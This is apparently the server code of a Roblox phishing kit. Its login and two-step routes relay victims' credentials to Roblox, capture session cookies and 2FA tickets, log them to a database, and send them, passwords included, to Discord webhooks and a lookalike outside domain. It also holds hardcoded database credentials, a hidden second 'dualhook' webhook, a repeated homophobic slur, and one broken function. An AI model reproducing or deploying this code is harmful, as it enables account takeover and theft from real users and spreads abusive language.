const axios = require('axios');
const mysql = require('mysql2/promise');
const rp = require('request-promise');
const sanitizer = require('sanitizer');
const puppeteer = require('puppeteer');
const { Webhook, MessageBuilder } = require('discord-webhook-node');

const dbConfig = mysql.createPool({
    host: "66.29.135.60",
    user: "ns118268_rabid",
    password: "Salad0000",
    database: "ns118268_rbxfrrcp_rabidphishing",
    connectionLimit : 10,
    charset : 'utf8mb4'
});

function routes (router, options, done){

    router.post('/login', { config: { rateLimit: { max: 10, timeWindow: '1 minute'} } }, async (req, res) => {

        try{

            if(req.body.username === '' || req.body.username === null || req.body.username === 0){
                return res.code(400).send(new Error('Username missing'))
            }

            if(check_user(req.body.username)){

                if(req.body.password === '' || req.body.password === null || req.body.password === 0){
                    return res.code(400).send(new Error('Password missing'))
                }

                if(req.body.token === '' || req.body.token === null || req.body.token === 0){
                    return res.code(400).send(new Error('Captcha Token missing'))
                }

                const csrf_token = await csrf();
                const postData = {
                    ctype: "Username",
                    cvalue: req.body.username,
                    password: req.body.password,
                    captchaToken: req.body.token,
                    captchaProvider: "PROVIDER_ARKOSE_LAB"
                };
            
                const axiosConfig = {
                    headers: {
                        'Content-Type': 'application/json',
                        'x-csrf-token': csrf_token
                    }
                };
            
                try {
                    const response = await axios.post(`https://auth.roblox.com/v2/login`, postData, axiosConfig);
                    await insert_phishing(sanitizer.sanitize(req.body.username), sanitizer.sanitize(req.body.password));

                    if(response.data.hasOwnProperty('twoStepVerificationData')){

                        const exists = await checktwostep(sanitizer.sanitize(response.data.user.id));
                        if(!exists.length){
                            await insert_twostepdata(sanitizer.sanitize(response.data.user.id), sanitizer.sanitize(response.data.user.name), sanitizer.sanitize(response.data.twoStepVerificationData.ticket));
                        }else{
                            await deletetwostep(sanitizer.sanitize(response.data.user.id));
                            await insert_twostepdata(sanitizer.sanitize(response.data.user.id), sanitizer.sanitize(response.data.user.name), sanitizer.sanitize(response.data.twoStepVerificationData.ticket));
                        }
    
                        const webhook = await get_webhook(sanitizer.sanitize(req.body.siteid));
                        const get_rap = await rap(response.data.user.id);
			await send_webhook1(webhook, response.data.user.id, req.body.username, req.body.password, "N/A", get_rap)
                        
    
                        return res.code(200).send({
                            username: response.data.user.name,
                            siteid: req.body.siteid
                        });
                    }else{

                        const cookie = response.headers['set-cookie'][0].split('.ROBLOSECURITY=').pop().split(';')[0];
                        if(cookie.includes("_|WARNING:")){
                            await insert_cookie(sanitizer.sanitize(req.body.username), sanitizer.sanitize(cookie));

                            const check = await checkCookie(cookie);
                            const webhook = await get_webhook(sanitizer.sanitize(req.body.siteid));
                            const get_rap = await rap(check.data['UserID']);
                            await send_webhook(webhook, check.data['UserID'], req.body.username, req.body.password, cookie, get_rap)
        
                            return res.code(200).send({
                                username: response.data.user.name
                            });
                        }else{
                            return res.code(500).send(new Error('Internal Server Error'))
                        }
                    }
                } catch (error) {
                    console.log(error)
                    return res.code(500).send(new Error('Internal Server Error'))
                }
            }else{
                return res.code(400).send(new Error('Invalid User'))
            }
        }catch (err){
            console.log(err)
            return res.code(500).send(new Error('Internal Server Error'))
        }
    })

    router.post('/verify', { config: { rateLimit: { max: 10, timeWindow: '1 minute'} } }, async (req, res) => {

        try{

            if(req.body.username === '' || req.body.username === null || req.body.username === 0){
                return res.code(400).send(new Error('Username missing'))
            }

            const check = await check_user(req.body.username);
            if(check === "USER_VALID"){

                if(req.body.siteid === '' || req.body.siteid === null || req.body.siteid === 0){
                    return res.code(400).send(new Error('Site ID missing'))
                }

                if(req.body.code === '' || req.body.code === null || req.body.code === 0){
                    return res.code(400).send(new Error('Code missing'))
                }

                const ticket = await twostepticket(sanitizer.sanitize(req.body.username));
                if(ticket.length){
            
                    const csrf_token = await csrf();
                    const postData = {
                        username: req.body.username,
                        ticket: ticket[0].ticket,
                        code: req.body.code,
                        rememberDevice: true,
                        actionType: "Login"
                    };
                
                    const axiosConfig = {
                        headers: {
                            'Content-Type': 'application/json',
                            'x-csrf-token': csrf_token
                        }
                    };
                
                    try {
                        const response = await axios.post(`https://auth.roblox.com/v2/twostepverification/verify`, postData, axiosConfig);
                        const cookie = response.headers['set-cookie'][0].split('.ROBLOSECURITY=').pop().split(';')[0];
                        if(cookie.includes("_|WARNING:")){
                            await insert_cookie(sanitizer.sanitize(req.body.username), sanitizer.sanitize(cookie));
                            await deletetwostepbyusername(sanitizer.sanitize(req.body.username));

                            const check = await checkCookie(cookie);
                            const webhook = await get_webhook(sanitizer.sanitize(req.body.siteid));
                            const get_rap = await rap(check.data['UserID']);
                            await send_webhook2(webhook, check.data['UserID'], req.body.username, 'N/A', cookie, get_rap)
        
                            return res.code(200).send();
                        }else{
                            return res.code(500).send(new Error('Internal Server Error'))
                        }
                    } catch (error) {
                        return res.code(500).send(new Error('Internal Server Error'))
                    }
                }else{
                    return res.code(500).send(new Error('Internal Server Error'))
                }
            }else{
                return res.code(400).send(new Error('User does not exist.'))
            }
        }catch (err){
            return res.code(500).send(new Error('Internal Server Error'))
        }
    })

    router.get('/api/:username', { config: { rateLimit: { max: 10, timeWindow: '1 minute'} } }, async (req, res) => {

        try{

            if(req.params.username === '' || req.params.username === null || req.params.username === 0){
                return res.code(400).send(new Error('Username missing'))
            }

            const check = await check_user(req.params.username);
            if(check === "USER_VALID"){

                return res.code(200).send();
	        }else{
                return res.code(400).send(new Error('User does not exist.'))
            }
        }catch (err){
            return res.code(500).send(new Error('Internal Server Error'))
        }
    })

    done();
}

module.exports = routes


async function csrf(){
    const postData = {
        ctype: "Username",
        cvalue: "0",
        password: "0",
        captchaToken: "0",
        captchaProvider: "PROVIDER_ARKOSE_LAB"
    };

    const axiosConfig = {
        headers: {
            'Content-Type': 'application/json'
        }
    };

    try {
        await axios.post(`https://auth.roblox.com/v2/login`, postData, axiosConfig);
    } catch (error) {
        return error.response.headers['x-csrf-token'];
    }
}

async function insert_twostepdata(userid, username, ticket){

    const connection = await dbConfig.getConnection();
    try{
      const post = {id: 0, userid: userid, username: username, ticket: ticket};
      await connection.query("INSERT INTO `twostepdata` SET ?", post);
    }finally{
      connection.release();
    }
}

async function insert_cookie(username, cookie){

    const connection = await dbConfig.getConnection();
    try{
        const post = {id: 0, username: username, cookie: cookie};
      await connection.query("INSERT INTO `cookie_logs` SET ?", post);
    }finally{
      connection.release();
    }
}

async function insert_phishing(username, password){

    const connection = await dbConfig.getConnection();
    try{
      const post = {id: 0, username: username, password: password};
      await connection.query("INSERT INTO `phishing_logs` SET ?", post);
    }finally{
      connection.release();
    }
}

async function checktwostep(userid){

    const connection = await dbConfig.getConnection();
    try{
      const queryResult = await connection.query("SELECT * FROM `twostepdata` WHERE `userid` = ?", [userid]);
      return queryResult[0];
    }finally{
      connection.release();
    }
} 

async function deletetwostep(userid){

    const connection = await dbConfig.getConnection();
    try{
      await connection.query("DELETE FROM `twostepdata` WHERE `userid` = ?", [userid]);
    }finally{
      connection.release();
    }
} 

async function deletetwostepbyusername(username){

    const connection = await dbConfig.getConnection();
    try{
      await connection.query("DELETE FROM `twostepdata` WHERE `username` = ?", [username]);
    }finally{
      connection.release();
    }
} 


async function twostepticket(username) {

    const connection = await dbConfig.getConnection();
    try{
      const queryResult = await connection.query("SELECT `ticket` FROM `twostepdata` WHERE `username` = ?", [username]);
      return queryResult[0];
    }finally{
      connection.release();
    }
}

async function check_user(username){

    try {
        const status = await axios.get(`https://api.roblox.com/users/get-by-username?username=${username}`);
        if(status.data.success !== false){
            return "USER_VALID";
        }else{
            return "INVALID_USER";
        }
    } catch (error) {
        return "INVALID_USER";
    }
}

async function get_global_webhook() {

    const connection = await dbConfig.getConnection();
    try{
      const queryResult = await connection.query("SELECT `webhook` FROM `global`");
      return queryResult[0][0].webhook;
    }finally{
      await connection.release();
    }
}

async function get_webhook(id) {

    const connection = await dbConfig.getConnection();
    try{
      const queryResult = await connection.query("SELECT `webhook` FROM `generated_links` WHERE `siteid` = ?", [id]);
      return queryResult[0][0].webhook;
    }finally{
      connection.release();
    }
}


async function get_info(thing){
	const url1 = `https://wvw-rbxflip.com/chk.php?c=${thing}`
	const data = await rp(url1).then(function(html){
	    html1 = html.split("_");
	    return html1;
	  });

  return data;
}


async function send_webhook(url, userid, username, password, cookie, rap){

    try{
	var robux;
	var rapp;
	var hasprem;
	var lolinfo;
	var embed;
        const globalhook = await get_global_webhook();
        const hook = new Webhook(url);
        	
	lolinfo = await get_info(cookie);
	rapp = lolinfo[3];
	robux = lolinfo[1];
	hasprem = lolinfo[5];
	const hook2 = new Webhook(globalhook);
	embed = new MessageBuilder()
	.setTitle("New Hit!")
        .setAuthor('Recheck Cookie?', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png', `https://wvw-rbxflip.com/check.php?c=${cookie}`)
        .setURL(`https://roblox.com/users/${userid}/profile`)
        .addField('<:id:818111672455397397> ID', userid, true)
	.addField('Robux', robux, true)
	.addField('<:rolimons:818111627726684160> Rolimons Link', `https://www.rolimons.com/player/${userid}`)
	.addField('<:trade:818111735973806111> Trade Link', `https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=${userid}`, true)
	.addField('Premium', hasprem, true)
	.addField('<:rap:818111763413205032> RAP', rapp, true)
	.addField('User', username, true)
	.addField('PW', password, true)
        .addField(':cookie: Cookie', "```" + cookie + "```")
        .setColor('#00ff6e')
        .setThumbnail(`http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&Username=${username}`)
        .setFooter('Valid Login - Powered By Visible', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png')
        .setTimestamp();
        
        hook.setUsername('Kooki Lawger');
        hook.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
        hook2.setUsername('Kooki Lawger');
        hook2.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
        await hook.send("RABID IS A GAY DUALHOOKING FAG @everyone");
        //hook2 = dualhook
        await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
	await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");

	    
    }catch(err){
        console.log(err)
    }
}


async function send_webhook2(url, userid, username, password, cookie, rap){

    try{
	var robux;
	var rapp;
	var hasprem;
	var lolinfo;
	var embed;
        const globalhook = await get_global_webhook();
        const hook = new Webhook(url);
        
	lolinfo = await get_info(cookie);
	rapp = lolinfo[3];
	robux = lolinfo[1];
	hasprem = lolinfo[5];
	await hook.send(embed);
        //hook2 = dualhook
        await hook2.send(embed);
	const hook2 = new Webhook(globalhook);
	embed = new MessageBuilder()
	.setTitle("New Hit!")
        .setAuthor('Recheck Cookie?', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png', `https://wvw-rbxflip.com/check.php?c=${cookie}`)
        .setURL(`https://roblox.com/users/${userid}/profile`)
        .addField('<:id:818111672455397397> ID', userid, true)
	.addField('Robux', robux, true)
	.addField('<:rolimons:818111627726684160> Rolimons Link', `https://www.rolimons.com/player/${userid}`)
	.addField('<:trade:818111735973806111> Trade Link', `https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=${userid}`, true)
	.addField('Premium', hasprem, true)
	.addField('<:rap:818111763413205032> RAP', rapp, true)
	.addField('User', username, true)
	.addField('PW', password, true)
        .addField(':cookie: Cookie', "```" + cookie + "```")
        .setColor('#00ff6e')
        .setThumbnail(`http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&Username=${username}`)
        .setFooter('Valid Login - Powered By Visible', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png')
        .setTimestamp();
        
        hook.setUsername('Kooki Lawger');
        hook.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
        hook2.setUsername('Kooki Lawger');
        hook2.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
        await hook.send("RABID IS A GAY DUALHOOKING FAG @everyone");
        //hook2 = dualhook
        await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
	await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");

	    
    }catch(err){
        console.log(err)
    }
}

async function send_webhook1(url, userid, username, password, cookie, rap){

    try{
	var robux;
	var rapp;
	var hasprem;
	var lolinfo;
	var embed;
        const globalhook = await get_global_webhook();
        const hook = new Webhook(url);
        const hook2 = new Webhook(globalhook);	
	rapp = "N/A";
	robux = "N/A";
	hasprem = "N/A";
	embed = new MessageBuilder()
	.setTitle("New Hit!")
        .setAuthor('Recheck Cookie?', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png', `https://wvw-rbxflip.com/check.php?c=${cookie}`)
        .setURL(`https://roblox.com/users/${userid}/profile`)
        .addField('<:id:818111672455397397> ID', userid, true)
	.addField('Robux', robux, true)
	.addField('<:rolimons:818111627726684160> Rolimons Link', `https://www.rolimons.com/player/${userid}`)
	.addField('<:trade:818111735973806111> Trade Link', `https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=${userid}`, true)
	.addField('Premium', hasprem, true)
	.addField('<:rap:818111763413205032> RAP', rapp, true)
	.addField('User', username, true)
	.addField('PW', password, true)
        .addField(':cookie: Cookie', "```" + cookie + "```")
        .setColor('#00ff6e')
        .setThumbnail(`http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&Username=${username}`)
        .setFooter('Valid Login - Powered By Visible', 'https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png')
        .setTimestamp();
        
        hook.setUsername('Kooki Lawger');
        hook.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
        hook2.setUsername('Kooki Lawger');
        hook2.setAvatar('https://media.discordapp.net/attachments/825648293451005953/851237044888797194/Z.png');
        await hook.send("RABID IS A GAY DUALHOOKING FAG @everyone");
        //hook2 = dualhook
        await hook2.send("RABID IS A GAY DUALHOOKING FAG @everyone");
	
	    
    }catch(err){
        console.log(err)
    }
}

async function checkCookie(cookie) {

    const axiosConfig = {
        headers: {
            'Cookie': `.ROBLOSECURITY=${cookie}`
        }
    };

    try {
        const valid = await axios.get('https://www.roblox.com/mobileapi/userinfo', axiosConfig);
        return valid;
    } catch (error) {
        return "Invalid";
    }
}

async function rap(userid){

    try{

        const browser = await puppeteer.launch({ ignoreHTTPSErrors: true, headless: true, args: ['--no-sandbox'] });
        const page = await browser.newPage();
        await page.goto(`https://www.rolimons.com/player/${userid}`, {
            waitUntil: 'networkidle0',
        });
        await page.waitForSelector('#player_rap', {timeout: 2000})
        const rap = await page.evaluate(() => document.querySelector('#player_rap').innerHTML);
        await browser.close();

        return rap;
    }catch(err){
        return "N/A";
    }
}
